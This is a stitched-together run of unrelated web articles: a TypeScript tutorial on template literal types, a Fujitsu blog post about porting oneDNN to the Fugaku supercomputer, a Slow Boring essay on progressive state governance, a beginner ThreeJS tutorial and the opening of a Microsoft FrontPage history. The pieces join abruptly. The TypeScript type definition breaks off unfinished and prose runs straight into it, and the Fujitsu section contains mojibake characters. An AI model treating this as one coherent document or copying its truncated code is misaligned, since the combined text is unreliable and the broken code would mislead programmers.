    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>To glue them together, we’ll need a function which takes the action and passes it to the correct method of our <code>BrownieCounter</code>.</p>

<div><div><pre><code><span>function</span> <span>dispatchAction</span><span>(</span><span>brownieCounter</span><span>:</span> <span>BrownieCounter</span><span>,</span> <span>action</span><span>:</span> <span>Action</span><span>):</span> <span>void</span> <span>{</span>
    <span>switch</span> <span>(</span><span>action</span><span>.</span><span>tag</span><span>)</span> <span>{</span>
        <span>case</span> <span>"</span><span>BAKE_BROWNIES</span><span>"</span><span>:</span>
            <span>brownieCounter</span><span>.</span><span>bakeBrownies</span><span>(</span><span>action</span><span>);</span>
            <span>break</span><span>;</span>
        <span>case</span> <span>"</span><span>EAT_BROWNIE</span><span>"</span><span>:</span>
            <span>brownieCounter</span><span>.</span><span>eatBrownie</span><span>(</span><span>action</span><span>);</span>
            <span>break</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>This is ok for now, but as we add more actions to our program, it’s going to get annoying having to add a new case for every one. Since the method names on our <code>BrownieCounter</code> are just camel case versions of the action tags, we can rewrite <code>dispatchAction</code> to generate the method name and call it. We just need a little <code>snakeCaseToCamelCase</code> helper function.</p>

<div><div><pre><code><span>function</span> <span>dispatchAction</span><span>(</span><span>brownieCounter</span><span>:</span> <span>BrownieCounter</span><span>,</span> <span>action</span><span>:</span> <span>Action</span><span>):</span> <span>void</span> <span>{</span>
    <span>(</span><span>brownieCounter</span> <span>as</span> <span>any</span><span>)[</span><span>snakeCaseToCamelCase</span><span>(</span><span>action</span><span>.</span><span>tag</span><span>)](</span><span>action</span><span>);</span>
<span>}</span>

<span>function</span> <span>snakeCaseToCamelCase</span><span>(</span><span>snakeCaseString</span><span>:</span> <span>string</span><span>):</span> <span>string</span> <span>{</span>
    <span>return</span> <span>(</span>
        <span>snakeCaseString</span>
        <span>.</span><span>split</span><span>(</span><span>"</span><span>_</span><span>"</span><span>)</span>
        <span>.</span><span>map</span><span>((</span><span>word</span><span>,</span> <span>i</span><span>)</span> <span>=&gt;</span>
            <span>i</span> <span>===</span> <span>0</span> <span>?</span>
                <span>word</span><span>.</span><span>toLowerCase</span><span>()</span> <span>:</span>
                <span>word</span> <span>&amp;&amp;</span> <span>(</span><span>word</span><span>[</span><span>0</span><span>].</span><span>toUpperCase</span><span>()</span> <span>+</span> <span>word</span><span>.</span><span>slice</span><span>(</span><span>1</span><span>).</span><span>toLowerCase</span><span>())</span>
        <span>)</span>
        <span>.</span><span>join</span><span>(</span><span>""</span><span>)</span>
    <span>);</span>
<span>}</span>
</code></pre></div></div>

<p>This avoids the boilerplate, but it’s a step backwards for type safety. As the type signature of <code>snakeCaseToCamelCase</code> only says it returns a string, the compiler has no way to know whether that string will be a valid method name for <code>BrownieCounter</code>, so we have to cast to <code>any</code> to allow it. Even worse, if we add a new action to the program, but forget to add a method to <code>BrownieCounter</code> to handle it, we won’t get a type error. It will not be until runtime that we see this sad message.</p>

<blockquote>
  <p><code>brownieCounter[snakeCaseToCamelCase(...)] is not a function</code></p>
</blockquote>

<p>Luckily, with TypeScript 4.1, we no longer need to choose between boilerplate and type safety. Using template literal types we can reimplement our case conversion at the type level. This requires another handy new feature - four new types for manipulating string literal types called <code>Uppercase</code>, <code>Lowercase</code>, <code>Capitalize</code> and <code>Uncapitalize</code>.</p>

<div><div><pre><code><span>type</span> <span>SnakeCaseToCamelCase</span><span>&lt;</span><span>S</span> <span>extends</span> <span>string</span><span>&gt;</span> <span>=</span>

<p>We can use this fancy new type to provide a more informative signature for our helper function.</p>

<h2>Introduction</h2>

<p>Hello everyone. This is <a href="https://github.com/kawakami-k">Kawakami</a> from the Fujitsu Laboratories Platform Innovation project. The new Fugaku supercomputer has been delivered to Port Island located off the coast of Kobe. Developed jointly by RIKEN and Fujitsu, this supercomputer has entered the trial run phase this year ahead of schedule. As of June, it has already won four "firsts" in worldwide supercomputer rankings (<a href="https://www.fujitsu.com/global/about/resources/news/press-releases/2020/0622-01.html">TOP500, HPCG, HPL-AI</a>, <a href="https://www.fujitsu.com/global/about/resources/news/press-releases/2020/0622-02.html">Graph500</a>), so it is off to a very promising start. My department is involved in researching and developing techniques to accelerate deep learning (DL) processes on Fugaku and PRIMEHPC FX1000/700, which is our product that uses the same CPU as Fugaku. In this post, I will talk about our efforts to port oneDNN (library software used to accelerate DL processes) to Fugaku, and to contribute and incorporate our source code into Intel's main branch of oneDNN.</p>

<h2>Software stack for deep learning processes</h2>

<p>Applications that make use of deep learning processes (hereinafter called â€œDL processesâ€�) normally consists of a software stack formed from two layers: a framework layer and a library layer (as shown below). When a user wants to run an application that uses a DL process, they use an API provided by the framework to define the neural network for the process to run and to describe processing details. The framework calls library software functions and calculates the actual DL process based on the provided definition and process details. The systems that run DL processes come in various forms and sizes (such as supercomputers, the cloud, PCs, and smartphones), and the hardware in the system that is actually running the process might be a CPU or GPU. By separating the software stack into two layers like this, different systems and hardware executing the DL process are merged in the library layer, so users can use the same framework. This is beneficial because it allows for the same ease of use for all users with regard to defining networks and describing processes.</p>

<figure title="Software stack for deep learning processes"><span itemscope="" itemtype="http://schema.org/Photograph"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/f/fltech/20201117/20201117072431.png" alt="f:id:fltech:20201117072431p:plain" title="" itemprop="image"></span><figcaption>Software stack for deep learning processes</figcaption></figure>

<p>Individually optimized library software is available to maximize system and hardware performance. This software is normally developed by the vendors who develop and manufacture the hardware. For example, Intel and NVIDIA have developed and made available libraries for Intel CPUs and NVIDIA GPUs, respectively. Fugaku and FX1000/700 are equipped with A64FX CPUs, which offer an expanded instruction set called Scalable Vector Extension (SVE) for High Performance Computing on top of the Armv8-A instruction set (the same CPU found in Android smartphones and iPhones). A64FX is the first CPU in the world to offer both the Armv8-A instruction set and the SVE instruction set (hereinafter, they are referred as â€œArmv8-A instruction setâ€� together), so there was no DL process library optimized for this CPU.</p>

<h2>Development of a DL process library for the Arm architecture</h2>

<p>There was no DL process library for the Armv8-A instruction set, so we needed to develop a new one. However, even if we at Fujitsu developed a new library on our own, users would not use it unless it could easily be used from the framework. We therefore decided to use the oneDNN DL library, developed by Intel for the x64 instruction set, as a reference implementation. oneDNN is the de facto standard for DL process libraries using CPUs, and it is already supported by a range of frameworks. A deep learning library for Armv8-A that includes APIs for oneDNN could therefore be used without a user having to modify a framework.</p>

<p>The source code for oneDNN has been released as <a href="https://github.com/oneapi-src/oneDNN">OSS (https://github.com/oneapi-src/oneDNN)</a>, so it can be obtained and recompiled for the Armv8-A instruction set. However, oneDNN contains many implementations optimized at the assembler level for the x64 instruction set, so simply recompiling the original source code would not provide enough performance. This was the start of our difficulties. We will discuss this later in this post.</p>

<p>The chart below is an example of the increases in processing speed we obtained through optimizing code for Armv8-A. oneDNN can be used to run a range of processes used in DL processing, such as convolution, batch_normalization, eltwise, pooling, and reorder. The chart below compares the processing speed for the reorder process (in which data types are converted or reordered) when the oneDNN source code is compiled without modification for the Armv8-A instruction set, and when the source code is compiled after our optimizations were implemented. The software processing speed obtained with the original oneDNN source code compiled without modification is normalized as a value of 1. As shown in the chart, we were able to increase the speed up to 400 times over, depending on the type of test pattern (although our optimizations actually decreased the speed for several test patterns, there would be no problem when using this together with a framework due to the small absolute values in measurement errors and processing times). Optimizing code for A64FX also resulted in extraordinary processing speed increases in other processes as well.</p>

<figure title="Measurement speed up of reorder processing"><span itemscope="" itemtype="http://schema.org/Photograph"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/f/fltech/20201117/20201117072157.png" alt="f:id:fltech:20201117072157p:plain" title="" itemprop="image"></span><figcaption>Measurement speed up of reorder processing</figcaption></figure>

<h2>Contribution of source code to the main branch of oneDNN</h2>

<p>I mentioned earlier that oneDNN source code has been released as OSS, but that is not all. It is being developed using an open development style that allows anyone to submit a pull request for source code they want to improve (request to incorporate improved source code into oneDNN). When a pull request has been submitted, the new source code is reviewed for bugs and tested to confirm that it improves the processing speed of oneDNN or helps to expand its functionality. If it passes both the review and test, it is incorporated into oneDNN. oneDNN is a software developed initially for CPUs with the x64 instruction set. The source code for our version of oneDNN, ported to and optimized for the Armv8-A instruction set, is available at <a href="https://github.com/fujitsu/oneDNN">https://github.com/fujitsu/oneDNN</a>. However, we thought that it would be beneficial for Fugaku users and many users in the world of CPUs that use the Armv8-A instruction set, if an implementation highly tuned for the main branch of oneDNN (the de facto DL process library) had been incorporated from the start. We therefore decided to work with Intel and actively submit a pull request to incorporate our changes into the main branch of oneDNN.</p>

<p>Incidentally, the improvements we made optimizing oneDNN for the Armv8-A instruction set were quite extensive, such as incorporating a required descriptor called Xbyak_aarch64 (explained later). For minor changes, all you need to do is modify the source code and submit a pull request. However, when submitting a pull request for large-scale changes to source code or for changes to APIs for parts related to the framework for oneDNN, you must first write a document called a Request For Comments (RFC) that describes what will be changed and summarizes the plan for doing so. Then, you must submit a pull request for the RFC itself for review and then merging. I put a lot of effort into writing the RFC knowing that this would benefit the many users of Fugaku and Armv8-A in the world. I treated this even more seriously than writing a research paper. It was a ton of work. But I finally did it. I submitted my RFC pull request. Before long, I received a question from an Intel developer on the RFC. I worked late into the night to make sure my answer was thorough. Then I went to sleep. And then I woke up. And then there was the next question. The Intel developer was located in the US, and because of the time difference the next question had been sent by the time I woke up. Not getting discouraged, I sent my response. Then I went to bed. And then I woke up. Next, the Intel developer had invited a developer from Arm to join in, since my RFP concerned an Arm product. It was now two-on-one battle. The Arm developer was located in the U.K. It was like we were playing volleyball and Arm and Intel had teamed for a spike fake-out. I could barely keep up. However, I were somehow able to answer all of their questions and they ultimately approved the RFC I had submitted. (Actually, they were really great people that treated me very kindly and asked purely technical questions. The fact that their questions came right after I responded due to the time difference actually meant that the process was going smoothly and shortened the time up to merging of the RFC.)</p>

<p>Once the RFC was merged, I next needed to submit a pull request for source code modified based on the RFC. I was able to keep up with the â€œspike fake-outsâ€� by Arm and Intel, and ultimately had the source code merged.
Having the source code (optimized for the Armv8-A instruction set) merged in an OSS project spearheaded by Intel caused quite a commotion in Fujitsu. It makes sense though. After all, from Intelâ€™s perspective this would help collaborating companies. Of course, the primary reason for this was that Intel opened the door on pull requests for other CPUs. So first of all, I would like to express my gratitude here for Intel. The secondary reason for this is that our source code was technically solid and that Intel recognized that it would help in developing DL process libraries. I do have to admit that I am a bit proud of this.</p>

<h2>Development of Xbyak_aarch64</h2>

<p>It is now time to discuss at some depth the technical aspects of porting and optimizing oneDNN for the Armv8-A instruction set. One of the key technologies in Intel's oneDNN is that it incorporates a JIT assembler called Xbyak (see the figure below).</p>

<figure title="Source code structure of oneDNN"><span itemscope="" itemtype="http://schema.org/Photograph"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/f/fltech/20201117/20201117072153.png" alt="f:id:fltech:20201117072153p:plain" title="" itemprop="image"></span><figcaption>Source code structure of oneDNN</figcaption></figure>

<p>Xbyak is a software developed by Shigeo Mitsunari of Cybozu Labs and released as <a href="https://github.com/herumi/xbyak">OSS (https://github.com/herumi/xbyak)</a>. Xbyak offers the following features.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Happy Monday! </p><p>I’m very excited to get my first real week here at <code>Slow Boring</code> off the ground. But first I wanted to thank everyone who subscribed on Friday or over the weekend. The show of support is incredibly gratifying, and with your help I think we can make this thing work. We’re going to do four weeks of free content, after which most of the content will be for paying members only, so sign up now while introductory rates apply. </p><p>I’d also like to encourage members to participate in the comments sections and open threads. I’ve traditionally been very comments-averse myself, even while thinking that comments seem like a good idea in theory. But I realized that paid membership programs are the right way to make this work. Since the only people in the comments are the people who are sufficiently bought-in to pay money, you’re not going to have drive-by trolling. I’ve been delving in and engaging, and I hope you will, too. </p><p>Now, on to the main event: I want to talk about the important question of what progressives do in politics in the places we govern.</p><h4>An upside to NIMBYism?</h4><p>Since people know I’m interested in the geographic bias of the political system and also in the consequences of housing scarcity in coastal cities, one question people sometimes ask me is whether NIMBYism is politically beneficial. The idea here is that housing scarcity in California drives people out of the state and into more conservative areas, which helps Democrats fight Senate skew.</p><p>I think this is probably wrong, factually speaking. California has what’s basically a state-level version of the Congressional Budget Office called the Legislative Analyst’s Office, and when they looked at <a href="https://lao.ca.gov/LAOEconTax/Article/Detail/265">net migration to and from California</a>, they found that “families with kids and those with only a high school education predominate among those moving from California to its top destination states,” while “college-educated 18 to 35 year olds led the way among those moving to California.” That makes sense as it’s working class families with kids who suffer most from housing scarcity. But that means it’s probably disproportionately Republicans leaving, which is also what <a href="https://www.sacbee.com/news/local/sacramento-tipping-point/article246370775.html">most of the anecdotal reporting says</a>. By the same token, exit polls say <a href="https://www.dallasnews.com/news/politics/2018/11/09/native-texans-voted-for-native-texan-beto-o-rourke-transplants-went-for-ted-cruz-exit-poll-shows/">Beto O’Rourke won native-born Texans in 2018</a> while losing transplants. </p><p>But more fundamentally, I don’t think finding ways to look on the bright side of bad policy choices is a good idea. </p><p>Friday’s post was mostly on the bummer theme of how, if progressives want to get anything done in federal politics, <a href="https://www.slowboring.com/p/welcome-to-slow-boring">we need to reconcile ourselves to trimming our sails quite a bit</a>. But the other side of the coin is that you need to reach for the impossible to some extent or you’ll never achieve anything. Creating an actual statewide high-quality universal preschool program that delivered great results and made everyone happy, for example, would be a great way to build momentum nationally for such a program. </p><p>It’s in the blue states like California where the stuff progressives want to be doing with their energy — dreaming big, organizing, demanding stuff — could actually accomplish something. But it’s going to take hard work and also, yes, some technocratic fussing. </p><h4>Social democracy in one Bay State</h4><p>My go-to example for this is Massachusetts, the state that pioneered both marriage equality and the Affordable Care Act, which became progressives’ two big national successes. </p><ul><li><p>At 6.9 million people, Massachusetts has a larger population than Finland or Denmark. </p></li><li><p>While some people say you can’t create a state-level social democracy in the United States because of the lack of monetary sovereignty, Finland is part of the Eurozone and needs to follow EU fiscal rules, and Denmark has its currency pegged to the Euro. </p></li><li><p>Massachusetts has open borders with the rest of the United States, but Finland and Denmark have open borders with the EU. </p></li><li><p>In PPP-adjusted terms, Massachusetts’ GDP per capita is a bit higher than oil-rich Norway and decidedly higher than Finland or Denmark.</p></li></ul><p>Long story short, Massachusetts has the material resources to make social democrats’ dreams come true. And even though Elizabeth Warren’s election results there indicate pretty clearly that she pays an electoral penalty for being seen as an unusually left-wing Democrat, she still easily wins statewide elections — “hey, those ideas are unusually left-wing!” is not an obvious loser there. </p><p>If the way forward for <em>Democrats</em> is to reconcile themselves to the realities of the political map, the way forward for <em>progressives</em> is to try to put forward a vision that’s actually exciting and appealing to the unusually progressive electorate of places like Massachusetts, then implement it in those places in a way that makes progressive politics look successful and appealing to voters everywhere. </p><ul><li><p>You probably can’t do “Medicare for All” in one state because of interactions with the federal Medicare program, but you could definitely do an ambitious public option with auto-enrollment that’s designed to gain market share over time.</p></li><li><p>You could definitely do free public college, or if that’s too expensive, you could do free community college. </p></li><li><p>All kinds of Green New Deal stuff about energy and transportation infrastructure is doable on the state level. </p></li><li><p>Child allowance and other strategies to reduce poverty are very doable on the state level, as are preschool and child care plans. </p></li><li><p>As David Madland points out, <a href="https://www.americanprogress.org/issues/economy/reports/2019/12/11/478539/guide-state-local-workers-boards/">state governments can even create wage boards</a> and move to a system of sectoral collective bargaining. </p></li></ul><p>State government is not a panacea or a long-term alternative to building national political power. But it is potentially a very effective way to make people’s lives better. And more to the point, it is potentially a very effective way to build national political power by <em>showing people you have good ideas that work</em> and that you know what you’re doing. </p><p>But a more ambitious version of state-level progressive governance would also have to confront the question of whether or not Blue America’s political leaders <em>do</em>, in fact, know what they’re doing. </p><h4>Who is Blue America for?</h4><p>I grew up in Manhattan, went to Harvard, then moved to DC, so I am personally a pretty out-of-touch person. </p><p>But my broad sense is that most middle class Americans think of the big blue states, especially New York and California, as nice places to live for rich snobs, not as places that have really high quality public services. People who wouldn’t want to live in Finland (it’s too cold, too dark, bad food) could still concede that it would be nice to have all these free social benefits. But while taxes really are higher in blue America, it’s not like San Francisco has the country’s best public schools or SUNY is the most impressive public university system. </p><p>That’s not to say these are horrible places to live! But what you get in New York is access to a unique set of cultural amenities. California has cultural amenities, great weather, and access to the natural beauty that lurks right outside the major cities. To gain access to those amenities you need to deal with  high housing costs. So if you’re rich and enjoy that stuff, you can have a nice house in Brooklyn. Alternatively, if you’re rich and live someplace cheaper, you can have a giant mansion, a couple of fancy cars, and a boat. If you’re <em>young,</em> you can have dismal accommodations in a big liberal city but have fun going out and meeting people. But a middle class couple with a generic job and a couple of kids isn’t setting out to blue America for the higher material living standards.  </p><p>That’s because there are huge regional differences in the cost of living in the United States, they disfavor the blue coastal areas, and they’re driven by housing costs.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F3cf76768-a235-452f-ac23-b63cfb81b41f_602x525.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F3cf76768-a235-452f-ac23-b63cfb81b41f_602x525.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/3cf76768-a235-452f-ac23-b63cfb81b41f_602x525.png&quot;,&quot;height&quot;:525,&quot;width&quot;:602,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:223939,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>If you’ve read anything that I’ve written ever, you know <a href="https://www.amazon.com/Rent-Too-Damn-High-Matters-ebook/dp/B0078XGJXO">the reason is land use regulations</a>. Reforming those policies is critical to making blue states great places to live, places that people associate with prosperity and policy success rather than eccentric lifestyle preferences. </p><p>And while public housing, affordable housing set-asides, and other forms of non-market or “social” housing can be a piece of the puzzle, market-rate housing is essential. </p><p>One reason it’s essential is that a well-governed, great place to live should be accessible to middle class people, not an upstairs/downstairs economy of rich people and the subsidy-dependent. But another reason is that robust market-rate housebuilding grows the economy and the tax base and at least makes it conceivable that you’re going to provide first-rate public services instead of just paying off old pension debt. And growing the tax base matters. It’s not true that you can’t build a robust welfare state in a governance unit that needs to balance its budget. But it <em>is</em> true that in state and local politics you are playing with real money. Cash spent on the library can’t go to the parks. Cash spent on the bus means higher taxes. To be popular and effective you need to deliver value, especially if you’re not sitting on a geyser of tech IPOs throwing off tax revenue.</p><h4>Subway socialism </h4><p>Over the past few years I’ve gotten really interested in the so-called <a href="https://www.thenation.com/article/archive/last-sewer-socialists/">“sewer socialists” of Milwaukee</a>.</p><p>In the early 20th century there was a big base of German immigrants in the Milwaukee area to whom socialism was not a scary foreign concept, so socialists were able to win elections and control municipal government. In office, they built one of the first municipal public works departments, and they were proud of the DPW’s accomplishments. Other socialists from elsewhere around the country were, as socialists in America typically are, left-wing intellectuals detached from practical governance. And they made fun of these Milwaukee guys for constantly talking about their public works rather than overthrowing capitalism. </p><p>But what the Milwaukee guys got was that if you want non-market provision of stuff, there comes a time when <em>you actually need to go do the stuff</em>.

<p>With a little knowledge in Javascript, you can do incredible things in 3D with ThreeJS. It’s much simpler than it looks and it’s so much fun. The only problem is the first learning barrier. Today, I’m taking that barrier down for you in 5 minutes. After that, all you’ll have to do is have fun.</p>



<h3>What is ThreeJS?</h3>



<p>ThreeJS is a library in Javascript, created by <a href="https://twitter.com/mrdoob" target="_blank" rel="noreferrer noopener">Mr.doob</a>, that allows you to manipulate 3D objects directly in the browser. What you have to understand is that ThreeJS, <strong>via Javascript</strong>, allows you to use <a href="https://en.wikipedia.org/wiki/WebGL" target="_blank" rel="noreferrer noopener">WebGL</a> in an <a href="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API/Tutorial" target="_blank" rel="noreferrer noopener">HTML5 canvas</a>.</p>



<p><strong>WebGL</strong> is a <strong>Javascript API</strong> that allows you to create 2D and 3D graphic rendering.<br>A <strong>canvas </strong>is an <strong>HTML component</strong> that is part of the HTML5 specification and allows to display graphic rendering.</p>



<p>ThreeJS, via Javascript, allows you to drive WebGL, and thus 3D. <strong>And the crazy part is that there is no additional installation and/or plugin needed !</strong> Import the the library and voila, the 3D world is opening.</p>



<figure><img src="https://i.imgur.com/voS76PB.jpg" data-src="https://i.imgur.com/voS76PB.jpg" alt=""></figure>



<p>So in summary, we have a <strong>Javascript library<strong>(ThreeJS)</strong></strong> that manipulates a <strong>Javascript API to do graphical rendering</strong> (WebGL) in an <strong>HTML5 component</strong>. Easy!</p>



<p>Now you’re going to tell me, why are we using ThreeJS? If it’s actually WebGL, why not write WebGL directly ?  The answer is pretty simple. </p>



<p>ThreeJS simplifies and shortens to the extreme the code needed to do whatever you want. <strong>ThreeJS does all the complex part for you.</strong> You just have to do simple Javascript on your side.</p>



<p>So if you have simple Javascript knowledge, ThreeJS gives you the power to do incredible things in 3D.</p>



<p>But concretely, how does it work?</p>



<h3>How does it work?</h3>



<p>To understand how ThreeJS works at a high level you need to put yourself in the shoes of a film director. Yes, poof, I’ve just decided, <strong>you’re a movie director now</strong>.</p>



<p>And to shoot your movie in Javascript, you’re going to need to create and manipulate several key elements.</p>



<ul><li><strong>The scene</strong></li></ul>



<p><strong>You can see the scene like the 3D world you’re going to work in.</strong> You’re going to arrange objects in this scene. You’re going to create as many objects as you want in your scene via the meshes.</p>



<hr>



<ul><li><strong>The meshes</strong></li></ul>



<p>Meshes are simply the objects that will be present in your scene. You will need to put light on these objects to see them. To see them, you will have to film them. To film them, you need a camera.</p>



<hr>



<ul><li><strong>The camera</strong></li></ul>



<p>As in real life, the camera will show a point of view of your scene. <strong>We’re going to talk about field of view (fov), to be precise.</strong> By moving the camera, you’re going to move objects in or out of this field of view. It’s what you see in this field of view of this camera that will be sent to the rendering engine.</p>



<hr>



<ul><li><strong>Rendering engine</strong></li></ul>



<p>The rendering engine takes the scene and the camera as parameters. <strong>With that, it displays everything in the HTML5 canvas I was telling you about at the beginning.</strong> The rendering engine will produce an image each time your screen is refreshed. In general, 60 frames per second. That’s what gives life to your animation!</p>



<p>I guess it can still be pretty abstract at the moment. I have to draw you a picture to make it more concrete. Ok, I’ll use my drawing skills then.</p>



<div><figure><img src="https://i.imgur.com/f7FVxpB.jpg" data-src="https://i.imgur.com/f7FVxpB.jpg" alt=""></figure></div>



<p>Can you tell i’m backend developer ?</p>



<p>Anyway, it should be much clearer now between the explanations and the drawing. But we’re getting to know each other, I know you want to see code now.</p>



<h3>Show the code</h3>



<p>As the Hello World app we’ll make it as simple as possible. We’re going to code the schema I made for you just before.</p>



<p>A basic scene with a cube in the middle. Except that instead of the cube, we’re going to put a cylinder, just because I feel like it. <strong>We’re going to make it spin on itself and we’re going to put it in the camera’s field of view.</strong></p>



<p>I’m going to comment strongly on each line so that you understand everything that’s going on. I will also frequently talk about <a href="https://threejs.org/docs/index.html#manual/en/introduction/Creating-a-scene" target="_blank" rel="noreferrer noopener">the official documentation</a>, so don’t hesitate to read it as you go along.</p>



<figure><img src="https://i.redd.it/57vwxbnx22w01.jpg" data-src="https://i.redd.it/57vwxbnx22w01.jpg" alt=""></figure>



<p>We start by <strong>declaring our scene</strong>, without that, nothing is visible! Then <strong>the rendering engine</strong> for our scene. Without this, no image will be created and displayed to the user. Then we want <strong>a camera</strong> to film the scene. Here we will use a perspective camera. The options allow us to configure the field of view.</p>



<pre data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">const scene = new THREE.Scene()
const renderer = new THREE.WebGLRenderer()
const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000)</pre>



<p>We already have everything we need to show things now. Let’s create the cylinder via a <a href="https://threejs.org/docs/#api/en/objects/Mesh" target="_blank" rel="noreferrer noopener">mesh</a>! To create a mesh we need two things.</p>



<p><strong>The geometric shape that the object will have</strong>. Here we want a cylinder so <strong><a href="https://threejs.org/docs/#api/en/geometries/CylinderGeometry" target="_blank" rel="noreferrer noopener">CylinderGeometry</a></strong> is perfect for our needs.</p>



<p><strong>The material of this object.</strong> The material is the digital version of real world materials. The materials control the color of the object and the degree of reflection of the surface. <strong>Here we put a basic material of red color.</strong></p>



<p>With these two parts we can create our object, add it to the scene and place the camera over it.</p>



<pre data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">const geometry = new THREE.CylinderGeometry(5, 5, 20, 32)
const material = new THREE.MeshBasicMaterial({ color: 0xff0000, wireframe: true })
const cylinder = new THREE.Mesh(geometry, material)

scene.add(cylinder)
camera.position.z = 20</pre>



<p>Then, we’re going to put the rendering engine in full screen and add it in the HTML page via the HTML5 canvas!</p>



<pre data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">renderer.setSize(window.innerWidth, window.innerHeight)
document.body.appendChild(renderer.domElement)</pre>



<p>Finally, we’re going to animate things up. <strong>We are going to create an animation function that will be called in an infinite loop.</strong> Each time we go through this function we’re going to:</p>



<ul><li>make the cylinder rotate on itself</li><li>ask the rendering engine to create and display an image</li><li>recall this same animation function</li></ul>



<pre data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">function animate() {
    cylinder.rotation.x += 0.01
    cylinder.rotation.y += 0.01

    renderer.render(scene, camera)

    requestAnimationFrame(animate)
}

animate()</pre>



<p>And that’s it ! Done ! I put everything in a codepen and let you play with it now.</p>







<p>I tried to make this article a highway for understanding Javascript 3D. I sincerely think that after this first barrier of understanding, you can quickly do incredible things! Go use you new power now.</p>



<figure><img src="https://i.pinimg.com/originals/ae/41/8b/ae418ba64065b2875f8970dd42756633.jpg" data-src="https://i.pinimg.com/originals/ae/41/8b/ae418ba64065b2875f8970dd42756633.jpg" alt=""></figure>



<p>A few weeks ago, I hadn’t touched 3D in any way, shape or form. Starting from the basic example I just presented to you, in a few days,<strong> I created a 3D web experience that takes you through the universe in your browser</strong>.</p>







<p>I’m really super proud of it and I invite you to <a href="https://www.jesuisundev.com/en/across-the-universe/" target="_blank" rel="noreferrer noopener">take a look at it</a>. There’s a story, music and it’s amazing. <strong><a href="https://across-universe.com/" target="_blank" rel="noreferrer noopener">A real show!</a></strong> If you’re even more curious, you have all <strong><a href="https://github.com/jesuisundev/acrosstheuniverse" target="_blank" rel="noreferrer noopener">the source code on my GitHub</a></strong>.</p>



<h3>Epilogue</h3>



<p>If I can do this kind of thing in a week, that’s proof that anyone can do it. Anything you can imagine as animation is within your reach with your knowledge of Javascript. And now that you have the ThreeJS base, it’s up to you to see if the adventure tempts you.</p>

	<img src="https://invisibleup.com/articles/33/thumb.png" alt="FrontPage: The Good, The Bad, and The Ugly thumbnail">
	
	

	<p>PLEASE don't use FrontPage for modern web development! It's filled with security vulnerabilities and obsolete standards. The goal of this is not to convince you otherwise. The newest version came out almost two decades ago!</p>

<p>Microsoft FrontPage. The mere mention of that name is making most (if not all) of you seasoned web devs groan. "FrontPage was utter rubbish from dark ages of GeoCities" you say. "Everything it touched was ruined with horrific output and proprietary nonsense!" And yes, it was.</p>
<p>But... FrontPage as a concept. As a dream of what could have been, and a window into what <em>was</em>. Letting the typical home user at the time create websites, express creativity, and conquer the world by storm, all without being forced to learn HTML or CSS or JavaScript... In that regard, FrontPage couldn't be beat.</p>
<p>Let's talk about why Microsoft FrontPage was for a brief period of time the ultimate content creation tool of the Internet, and why it later fell from grace.</p>
<h2>History</h2>
<p>Before we can talk about goodness and ugliness, we need to talk about carphones and business meetings. Because this was 1994, when the Internet was still really new. At that point in time most internet chatter occured on Usenet groups (think something like Reddit) or BBS systems (think something like <a href="https://invisibleup.com//articles/5/">old AOL</a>; example pictured below). If you needed buisness stuff, like stocks or the such, you had to log onto the BBS of whoever had what you needed. This was kind of a pain.</p>
<p><img alt="A picture of a BBS (tilde.town) as of today" src="https://invisibleup.com//articles/33/BBS.png"></p>
<p>Enter Randy Forgaard and Charles H. Ferguson. Ferguson, renowned computer industry consultant, contacted MIT graduate Forgaard (over carphone, in case you were wondering) to discuss starting a new, internet-based company.</p>
<p>His idea was that many corporations such as the Dow Jones, Bloomberg, Apple, etc. were sinking millions into building their own, completely incompatible dial-in Internet services. Therefore, they should create a standardized, completely open server/client combo to replace all the independent efforts. This hopefully would reduce the cost of development for those corporations, and provide a market for growth by making buisnesses <em>want</em> to have an Interent presence.</p>
<p>The two decided to found their own company, Vermeer Technologies, Inc. A month later, still in the planning stages, they caught wind of the brand new World Wide Web out of CERN. It was decentralized, open, and even more robust than they were planning. It was just about perfect. The only issue was that it was rather a pain to make websites if you were just some lowly advertising manager or whoever. The web needed an authoring tool for websites.</p>
<p><img alt="FrontPage 1.0a, taken from WinWorldPC.com" src="https://invisibleup.com//articles/33/FP-1.0.png"></p>
<p>So, somehow, they managed to hire many professional coders for no salary whatsoever to work on FrontPage. (Early start-up culture, perhaps?) Evidently it worked, as FrontPage was released (only!) a week behind schedule on October of 1995. By then the World Wide Web was exploding, with a 20% increase in sites <em>per month</em>. FrontPage also managed to explode, receiving many awards and positive reviews. In fact, it was so good that Microsoft ended up buying them out. According to them, not only did it feel like a native Office application, it was perfect for their ongoing plan to become more internet centric.</p>
<p><img alt="FrontPage 97, taken from WinWorldPC.com" src="https://invisibleup.com//articles/33/FP-97.png"></p>
